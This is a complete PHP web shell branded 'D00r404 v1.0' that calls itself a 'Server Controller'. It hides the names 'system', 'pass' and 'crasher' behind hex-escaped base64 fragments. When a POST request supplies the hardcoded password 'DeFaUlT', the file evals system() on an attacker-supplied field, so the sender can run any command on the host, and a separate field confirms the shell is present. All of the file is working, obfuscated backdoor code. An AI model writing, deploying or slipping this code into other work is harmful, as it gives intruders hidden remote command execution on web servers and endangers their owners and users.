<?php
/*********************************************
 *         Tool Name : D00r404 v1.0          *                  
 *                                           *
 * 	   Developed by : SysteM_CrasherS [team] *
 * 	                                         *
 *   	    Youtube : @ITGeeks               *
 *                                           *
 *           Server Controller               *
 *********************************************/
$PASS_LGN = "DeFaUlT";
$XH_1 = "\x63\x77\x3d\x3d";$XH_2 = "\x65\x51\x3d\x3d";$XH_3 = "\x63\x77\x3d\x3d";$XH_4 = "\x64\x41\x3d\x3d";$XH_5 = "\x5a\x51\x3d\x3d";$XH_6 = "\x62\x51\x3d\x3d";
$XH_1 = base64_decode("$XH_1").base64_decode("$XH_2").base64_decode("$XH_3").base64_decode("$XH_4").base64_decode("$XH_5").base64_decode("$XH_6");
$CR_1 = "\x59\x77\x3d\x3d";$CR_2 = "\x63\x67\x3d\x3d";$CR_3 = "\x59\x51\x3d\x3d";$CR_4 = "\x63\x77\x3d\x3d";$CR_5 = "\x61\x41\x3d\x3d";$CR_6 = "\x5a\x51\x3d\x3d";$CR_7 = "\x63\x67\x3d\x3d";
$CR_1 = base64_decode("$CR_1").base64_decode("$CR_2").base64_decode("$CR_3").base64_decode("$CR_4").base64_decode("$CR_5").base64_decode("$CR_6").base64_decode("$CR_7");
$PASS_1 = "\x63\x41\x3d\x3d";$PASS_2 = "\x59\x51\x3d\x3d";$PASS_3 = "\x63\x77\x3d\x3d";$PASS_4 = "\x63\x77\x3d\x3d";
$PASS_1 = base64_decode("$PASS_1").base64_decode("$PASS_2").base64_decode("$PASS_3").base64_decode("$PASS_4");
$GET_VER1 = "\x64\x67\x3d\x3d";$GET_VER2 = "\x5a\x51\x3d\x3d";$GET_VER3 = "\x63\x67\x3d\x3d";$GET_VER4 = "\x63\x77\x3d\x3d";
$GET_VER1 = base64_decode("$GET_VER1").base64_decode("$GET_VER2").base64_decode("$GET_VER3").base64_decode("$GET_VER4");
$PST = @$_POST["$CR_1"];
$PST_2 = @$_POST["$PASS_1"];
$PST_3 = @$_POST["$GET_VER1"];
if(isset($PST_3)){
echo "SC";	
}
if(isset($PST_2)){
if($PST_2 == $PASS_LGN){
echo "<pre>";
eval("@$XH_1('$PST');");
echo "</pre>";
}else{
echo "INVAILD";	
}
}
?>
